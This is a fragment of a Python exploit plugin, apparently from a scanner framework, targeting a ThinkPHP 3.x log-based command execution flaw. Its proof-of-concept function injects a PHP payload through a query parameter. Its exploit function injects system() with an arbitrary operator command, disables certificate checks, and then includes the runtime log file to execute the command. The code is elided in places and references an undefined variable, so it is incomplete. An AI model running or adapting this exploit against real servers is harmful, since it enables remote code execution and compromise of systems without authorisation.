...
def vuln_info():
    info={
        'vuln_name': 'ThinkPHP 3.x Log命令执行',  #漏洞名称
...
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    try:
       ...
       # rp = requests.get(url + "/?m=Home&c=Index&a=index&test=--><?=var_dump('xiaohei');?>",headers=heads)
        req = urllib.request.Request(url + "/?m=Home&c=Index&a=index&test=-><?=var_dump('xiaohei');?>",headers=heads)
...
def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    try:
        ...
        if exp_data['type']=='cmd':
            ...
            result = {"Result":False,"Result_Info":"payload"}
            context = ssl._create_unverified_context()
            req = urllib.request.Request(url + "/?m=Home&c=Index&a=index&test=--><?=system('"+exp_data['command']+"');?>",headers=heads)
            urllib.request.urlopen(req,context=context)
            rp = requests.get(url+"/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/"+data+".log",headers=heads,verify=False)
            if rp.text!="":
                # resultdata = getmidstring(rp.text,"-->","INFO")
                # print(resultdata)
                result['Result'] = True
